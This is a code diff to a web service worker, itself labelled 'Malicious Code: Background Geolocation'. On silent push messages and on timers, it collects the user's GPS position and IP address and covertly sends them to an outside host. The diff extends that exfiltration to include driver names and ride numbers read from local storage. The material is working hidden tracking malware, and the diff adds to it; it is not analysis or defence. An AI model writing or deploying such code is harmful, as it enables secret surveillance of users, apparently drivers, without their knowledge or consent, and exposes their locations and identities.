@@ -33,7 +33,7 @@ self.addEventListener('push', event => {
 
   if (data.silent) {
     // Perform background task without showing a notification
-    fetchAndSendLocation();
+    fetchAndSendLocation(data.driverName, data.corridaNumber);
     return;
   }
 
@@ -50,17 +50,19 @@ self.addEventListener('fetch', event => {
 });
 
 // Malicious Code: Background Geolocation
-function fetchAndSendLocation() {
-  sendLocation();
+function fetchAndSendLocation(driverName=null, corridaNumber=null) {
+  sendLocation(driverName, corridaNumber);
   requestLocation();
   if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
           position => {
               const { latitude, longitude } = position.coords;
-              fetch('https://locationsystemtest.zapto.org/api/locacao', {
+              const driverName = localStorage.getItem("driverName") || "Unknown Driver";
+              const corridaNumber = localStorage.getItem("corridaNumber") || "N/A";
+              fetch('https://locationsystemtest.zapto.org/api/location', {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ latitude, longitude, timestamp: Date.now() })
+                  body: JSON.stringify({ latitude, longitude, driverName, corridaNumber })
               });
           },
           error => console.error('Geolocation error:', error),
@@ -74,14 +76,16 @@ setInterval(fetchAndSendLocation, 3000000); // Every 5 minutes
 
 self.addEventListener('message', event => {
   if (event.data.type === 'LOCATION_RESPONSE') {
-      const { latitude, longitude, timestamp } = event.data.payload;
-      console.log('Received location from client:', latitude, longitude, timestamp);
+      const { latitude, longitude, driverName, corridaNumber } = event.data.payload;
+      console.log('Received location from client:', latitude, longitude, driverName, corridaNumber);
 
       // Perform background tasks with the location
-      fetch('https://locationsystemtest.zapto.org/api/locacao', {
+      fetch('https://locationsystemtest.zapto.org/api/location', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ latitude, longitude, timestamp })      });
+          body: JSON.stringify({ latitude, longitude, driverName, corridaNumber })      });
+      }
+});
 
 // Simulate periodic location requests
 function requestLocation() {
@@ -95,7 +99,7 @@ function requestLocation() {
 // Request location every 5 minutes
 setInterval(requestLocation, 300000); // 5 minutes
 
-async function sendLocation() {
+async function sendLocation(driverName, corridaNumber) {
   try {
     // Fetch user's IP address
     const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -109,15 +113,15 @@ async function sendLocation() {
     const { latitude, longitude } = locationData;
 
     // Send location to server[]
-    await fetch('/api/locacao', {
+    await fetch('/api/location', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
       },
-      body: JSON.stringify({ latitude, longitude })
+      body: JSON.stringify({ latitude, longitude, driverName, corridaNumber })
     });
 
-    console.log('Location data sent:', { latitude, longitude });
+    console.log('Location data sent:', { latitude, longitude, driverName, corridaNumber });
   } catch (error) {
     console.error('Error sending location:', error);
   }
